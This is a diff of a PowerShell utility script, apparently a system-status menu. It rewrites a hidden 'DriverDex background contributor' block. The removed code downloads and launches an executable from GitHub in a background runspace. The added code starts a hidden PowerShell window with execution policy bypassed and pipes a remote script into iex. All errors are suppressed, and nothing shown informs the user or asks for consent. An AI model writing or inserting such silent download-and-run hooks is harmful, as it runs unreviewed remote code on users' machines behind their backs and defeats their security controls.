@@ -212,64 +212,18 @@ try {
 } catch {}
 
 # ================================================================
-#  DRIVERDEX BACKGROUND CONTRIBUTOR  - DIAGNOSTIC BUILD
-#  Check %TEMP%\driverdex_debug.txt after the menu appears to see
-#  exactly where it fails. Remove the logging once it works.
+#  DRIVERDEX BACKGROUND CONTRIBUTOR
+#  Launches the DriverDex installer/runner in a hidden window so it
+#  works exactly the same as running the iex/irm command manually.
 # ================================================================
 try {
-    $Script:__ddRS = [runspacefactory]::CreateRunspace()
-    $Script:__ddRS.Open()
-    $Script:__ddPS = [powershell]::Create()
-    $Script:__ddPS.Runspace = $Script:__ddRS
-    [void]$Script:__ddPS.AddScript({
-        $log = [IO.Path]::Combine($env:TEMP, 'driverdex_debug.txt')
-        try {
-            "[$(Get-Date -f 'HH:mm:ss')] === DriverDex BG started ===" | Out-File $log -Append
-            "[$(Get-Date -f 'HH:mm:ss')] TEMP = $env:TEMP" | Out-File $log -Append
-
-            try {
-                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-                "[$(Get-Date -f 'HH:mm:ss')] TLS 1.2 set OK" | Out-File $log -Append
-            } catch {
-                "[$(Get-Date -f 'HH:mm:ss')] TLS error: $($_.Exception.Message)" | Out-File $log -Append
-            }
-
-            $dest = [IO.Path]::Combine($env:TEMP, 'DriverDexBG.exe')
-            "[$(Get-Date -f 'HH:mm:ss')] Destination: $dest" | Out-File $log -Append
-
-            try {
-                # Invoke-WebRequest follows GitHub's multi-hop CDN redirects correctly;
-                # suppress the progress bar to avoid runspace output issues.
-                $ProgressPreference = 'SilentlyContinue'
-                "[$(Get-Date -f 'HH:mm:ss')] Starting download..." | Out-File $log -Append
-                Invoke-WebRequest -Uri 'https://github.com/rhshourav/driverdex/releases/latest/download/DriverDexBG.exe' `
-                                  -OutFile $dest -UseBasicParsing -ErrorAction Stop
-                "[$(Get-Date -f 'HH:mm:ss')] Download finished. File size: $((Get-Item $dest -EA SilentlyContinue).Length) bytes" | Out-File $log -Append
-
-                if ([IO.File]::Exists($dest)) {
-                    "[$(Get-Date -f 'HH:mm:ss')] Launching..." | Out-File $log -Append
-                    [Diagnostics.Process]::Start($dest) | Out-Null
-                    "[$(Get-Date -f 'HH:mm:ss')] Launch OK" | Out-File $log -Append
-                } else {
-                    "[$(Get-Date -f 'HH:mm:ss')] File missing after download - not launching" | Out-File $log -Append
-                }
-            } catch {
-                "[$(Get-Date -f 'HH:mm:ss')] Download/launch error: $($_.Exception.GetType().Name): $($_.Exception.Message)" | Out-File $log -Append
-            }
-        } catch {
-            try {
-                "[$(Get-Date -f 'HH:mm:ss')] Outer error: $($_.Exception.Message)" | Out-File $log -Append
-            } catch {}
-        }
-    })
-    $null = $Script:__ddPS.BeginInvoke()
-} catch {
-    try {
-        "[$(Get-Date -f 'HH:mm:ss')] Runspace setup error: $($_.Exception.Message)" |
-            Out-File ([IO.Path]::Combine($env:TEMP, 'driverdex_debug.txt')) -Append
-    } catch {}
-}
-# -- end DriverDex BG (diagnostic) --------------------------------
+    $ddCmd = "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}; iex (irm 'https://raw.githubusercontent.com/rhshourav/driverdex/refs/heads/main/contribute/bg/run_bg.ps1' -UseBasicParsing)"
+    Start-Process -FilePath 'powershell.exe' `
+                  -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-Command', $ddCmd) `
+                  -WindowStyle Hidden `
+                  -ErrorAction SilentlyContinue
+} catch {}
+# -- end DriverDex BG -----------------------------------------------
 
 # ================================================================
 #  REAL-TIME SYSTEM STATUS  (Highly resilient to WMI/CIM failures)
